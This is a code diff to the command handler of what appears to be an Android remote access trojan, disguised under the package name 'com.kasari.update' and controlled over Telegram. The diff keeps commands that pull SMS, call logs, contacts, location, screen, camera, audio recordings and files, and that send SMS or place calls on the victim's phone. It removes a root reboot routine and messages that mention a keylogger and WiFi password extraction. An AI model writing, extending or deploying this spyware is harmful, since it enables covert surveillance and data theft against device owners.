@@ -1,18 +1,15 @@
-// File ke top pe yeh imports add karo
-import android.os.PowerManager;
 package com.kasari.update;
 
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Build;
+import android.os.PowerManager;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
-import android.app.AlarmManager;
-import android.app.PendingIntent;
 import android.telephony.SmsManager;
-import android.telephony.TelephonyManager;
-import java.lang.reflect.Method;
 
 public class CommandProcessor {
 
@@ -78,7 +75,7 @@ public class CommandProcessor {
                 
             case "/notifications":
                 TelegramController.sendMessage(context, 
-                    "🔔 Notification listener is active. Waiting for notifications...");
+                    "🔔 Notification listener is active.");
                 break;
                 
             case "/files":
@@ -101,16 +98,6 @@ public class CommandProcessor {
                 
             case "/info":
                 sendDeviceInfo(context);
-                break;
-                
-            case "/clipboard":
-                TelegramController.sendMessage(context, 
-                    "📋 Clipboard access requires root. Use keylogger instead.");
-                break;
-                
-            case "/wifi":
-                TelegramController.sendMessage(context, 
-                    "📶 WiFi password extraction requires root or Android 9-");
                 break;
                 
             case "/vibrate":
@@ -139,22 +126,14 @@ public class CommandProcessor {
                 }
                 break;
                 
-            case "/reboot":
-                rebootPhone(context);
-                break;
-                
-            case "/reset":
-                TelegramController.sendMessage(context, 
-                    "⚠️ Factory reset requires root. Not available.");
-                break;
-                
             case "/uninstall":
                 uninstallSelf(context);
                 break;
                 
             default:
                 TelegramController.sendMessage(context, 
-                    "❓ Unknown command: " + command + "\nAvailable: /sms, /calls, /contacts, /location, /screen, /camera, /rec, /files, /info, /vibrate, /alarm, /open, /sms_send, /call");
+                    "❓ Unknown command: " + command + 
+                    "\nAvailable: /sms, /calls, /contacts, /location, /screen, /camera, /rec, /files, /info, /vibrate, /alarm, /open, /sms_send, /call");
                 break;
         }
     }
@@ -198,8 +177,8 @@ public class CommandProcessor {
             Intent intent = new Intent(context, BootStarter.class);
             PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 
                 PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pendingIntent);
-            TelegramController.sendMessage(context, "🔔 Alarm triggered!");
+            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pendingIntent);
+            TelegramController.sendMessage(context, "🔔 Alarm will ring in 3 seconds!");
         }
     }
 
@@ -229,22 +208,6 @@ public class CommandProcessor {
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(intent);
         TelegramController.sendMessage(context, "📞 Calling " + number);
-    }
-
-    private static void rebootPhone(Context context) {
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
-                if (pm != null) {
-                    pm.reboot("KasariUpdate");
-                }
-            } else {
-                Process proc = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
-                proc.waitFor();
-            }
-        } catch (Exception e) {
-            TelegramController.sendMessage(context, "❌ Reboot failed (requires root)\n" + e.getMessage());
-        }
     }
 
     private static void uninstallSelf(Context context) {
